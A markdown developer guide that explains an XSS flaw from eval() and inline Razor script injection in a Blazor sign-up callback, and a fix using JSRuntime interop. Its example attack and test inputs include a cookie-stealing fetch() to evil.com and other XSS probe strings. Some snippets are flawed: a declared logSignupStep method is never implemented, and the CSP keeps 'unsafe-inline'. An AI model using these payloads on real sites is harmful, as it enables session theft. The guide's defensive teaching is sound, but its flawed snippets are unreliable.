# XSS Prevention in AuthCallback - Security Fix

## Problem: XSS Vulnerability with eval() and Inline Script Injection

### ❌ Unsafe Pattern (NEVER DO THIS)
```razor
<!-- DANGEROUS: eval() or inline script injection -->
<script>
    // This creates XSS vulnerability - user input is concatenated into executable code
    var accountType = '@sessionData.AccountType'; // Direct injection
    eval("console.log('User created account: " + accountType + "')"); // NEVER use eval()
    
    // OR inline script with dynamic values
    window.gtag('event', 'signup', { account: '@sessionData.AccountType' });
</script>
```

### Why This is Dangerous
1. **String Concatenation Risk**: If `sessionData.AccountType` contains `'; alert('XSS'); //`, it executes arbitrary JavaScript
2. **eval() Execution**: `eval()` executes any string as code, making it a prime XSS target
3. **No Sanitization**: Values are directly injected without validation or encoding

**Example Attack:**
```csharp
sessionData.AccountType = "personal'; fetch('https://evil.com/steal?cookie=' + document.cookie); //"
```

This would execute:
```javascript
eval("console.log('User created account: personal'); fetch('https://evil.com/steal?cookie=' + document.cookie); //')");
```

---

## ✅ Solution: Safe JS Interop with Parameter Passing

### Implementation

#### 1. TypeScript Module (`TypeScript/signupLogger.ts`)
```typescript
interface SignupLoggerModule {
    logWorkspaceCreated(accountType: string): void;
    logSignupStep(step: string, accountType: string, metadata?: Record<string, string>): void;
}

const signupLogger: SignupLoggerModule = {
    logWorkspaceCreated(accountType: string): void {
        // Validate and sanitize input
        const validAccountTypes = ['personal', 'business'];
        const sanitizedAccountType = validAccountTypes.includes(accountType.toLowerCase()) 
            ? accountType.toLowerCase() 
            : 'unknown';

        console.log('[Signup] Workspace created', {
            accountType: sanitizedAccountType,
            timestamp: new Date().toISOString()
        });
    }
};

window.signupLogger = signupLogger;
export default signupLogger;
```

#### 2. Blazor Component (`AuthCallback.razor`)
```razor
@code {
    private async Task ProcessSignupCallbackAsync()
    {
        // ✅ SAFE: Load data via JS interop (auto-serialized)
        string? sessionDataJson = await JSRuntime.InvokeAsync<string?>("localStorage.getItem", "signup_session");
        
        SignupSessionData? sessionData = System.Text.Json.JsonSerializer.Deserialize<SignupSessionData>(sessionDataJson);
        
        // ✅ SAFE: Pass accountType as parameter - JSRuntime auto-serializes
        // NO eval(), NO string concatenation, NO inline script injection
        await JSRuntime.InvokeVoidAsync("signupLogger.logWorkspaceCreated", sessionData.AccountType);
        
        // ✅ SAFE: Multiple parameters also auto-serialized
        await JSRuntime.InvokeVoidAsync("signupLogger.logSignupStep", "auth_callback_received", sessionData.AccountType);
    }
}
```

---

## Security Benefits

### 1. **Automatic Serialization**
`JSRuntime.InvokeVoidAsync()` automatically serializes parameters to JSON, preventing code injection:

```csharp
// If accountType = "personal'; alert('XSS'); //"
await JSRuntime.InvokeVoidAsync("signupLogger.logWorkspaceCreated", accountType);

// JavaScript receives:
signupLogger.logWorkspaceCreated("personal'; alert('XSS'); //");
// The string is QUOTED and ESCAPED - it's a string literal, not executable code
```

### 2. **No eval() Execution**
The TypeScript function receives a **string value**, not executable code:
- No `eval()` call
- No `Function()` constructor
- No inline script execution

### 3. **Input Validation**
The TypeScript module validates and sanitizes input:
```typescript
const validAccountTypes = ['personal', 'business'];
const sanitizedAccountType = validAccountTypes.includes(accountType.toLowerCase()) 
    ? accountType.toLowerCase() 
    : 'unknown';
```

Even if an attacker injects malicious data, it's rejected or replaced with 'unknown'.

### 4. **No String Concatenation**
Values are passed as **function parameters**, not concatenated into strings:
```typescript
// ❌ UNSAFE: String concatenation
eval("console.log('Account: " + accountType + "')");

// ✅ SAFE: Function parameter
logWorkspaceCreated(accountType);
```

---

## Comparison: Before vs After

| Aspect | ❌ Unsafe (eval/inline) | ✅ Safe (JS Interop) |
|--------|------------------------|---------------------|
| **Method** | `eval()` or inline `<script>` | `JSRuntime.InvokeVoidAsync()` |
| **Data Flow** | String concatenation | Parameter passing |
| **Serialization** | Manual (unsafe) | Automatic (safe) |
| **XSS Risk** | High | None |
| **Validation** | None | Input sanitized |
| **Maintainability** | Poor | Excellent |

---

## Additional Security Measures

### 1. Content Security Policy (CSP)
Add to `App.razor` or server response headers:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
```

This blocks:
- Inline `eval()` calls
- External script loading (unless whitelisted)
- Data exfiltration to unauthorized domains

### 2. Input Validation on Backend
Always validate on the backend, even if client-side validation exists:
```csharp
public sealed class SignupRequest
{
    [Required]
    [StringLength(50)]
    [RegularExpression(@"^[a-zA-Z\s]+$", ErrorMessage = "Only letters allowed")]
    public string FirstName { get; set; } = string.Empty;

    [Required]
    [EnumDataType(typeof(AccountTypeEnum))]
    public string AccountType { get; set; } = string.Empty;
}
```

### 3. TypeScript Strict Mode
Use TypeScript's strict mode to catch type errors:
```json
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true
  }
}
```

---

## Testing for XSS Vulnerabilities

### Manual Test Cases
Try these malicious inputs as `AccountType`:

1. **Script Injection**: `<script>alert('XSS')</script>`
2. **Event Handler**: `" onload="alert('XSS')`
3. **JavaScript Protocol**: `javascript:alert('XSS')`
4. **Data Exfiltration**: `'; fetch('https://evil.com/steal?data='+document.cookie); //`

**Expected Result**: All should be safely escaped or sanitized.

### Automated Testing
```csharp
[Test]
public async Task LogWorkspaceCreated_WithMaliciousInput_SanitizesValue()
{
    // Arrange
    string maliciousInput = "personal'; alert('XSS'); //";
    
    // Act
    await JSRuntime.InvokeVoidAsync("signupLogger.logWorkspaceCreated", maliciousInput);
    
    // Assert
    // The JavaScript function should receive the string as-is (safely quoted)
    // and sanitize it to 'unknown' because it doesn't match 'personal' or 'business'
}
```

---

## Key Takeaways

1. **NEVER use eval()** - It's a direct path to XSS vulnerabilities
2. **NEVER concatenate user input into JavaScript strings** - Use function parameters
3. **ALWAYS use `JSRuntime.InvokeVoidAsync()`** - It auto-serializes and escapes
4. **ALWAYS validate and sanitize in TypeScript** - Defense-in-depth
5. **ALWAYS validate on the backend** - Client-side validation is not security

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Blazor JavaScript Interop](https://learn.microsoft.com/en-us/aspnet/core/blazor/javascript-interoperability/)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [TypeScript Strict Mode](https://www.typescriptlang.org/tsconfig#strict)

---

## Files in This Implementation

- `TypeScript/signupLogger.ts` - TypeScript module with safe logging functions
- `wwwroot/js/signupLogger.js` - Compiled JavaScript output
- `wwwroot/js/signupLogger.d.ts` - TypeScript type definitions
- `Components/Pages/Auth/AuthCallback.razor` - Secure Blazor component using JS interop
- `Models/Auth/SignupSessionData.cs` - Session data model
- `XSS-PREVENTION-GUIDE.md` - This security documentation
